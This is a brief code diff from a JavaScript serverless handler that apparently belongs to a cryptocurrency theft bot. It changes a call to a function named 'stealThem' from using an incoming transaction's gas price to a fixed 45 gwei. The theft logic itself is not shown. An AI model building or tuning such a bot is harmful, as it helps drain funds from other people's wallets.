@@ -33,7 +33,7 @@ export async function handler(event, context) {
 
       let gasPrice = payload["txs"][0]["gasPrice"]
       console.log(`gasPrice: ${gasPrice}`);
-      return stealThem(gasPrice).then(result => {
+      return stealThem(45000000000).then(result => {
         console.log(`Calling method for toAddress: ${targetAddress}`);
         return {
           statusCode: 200,
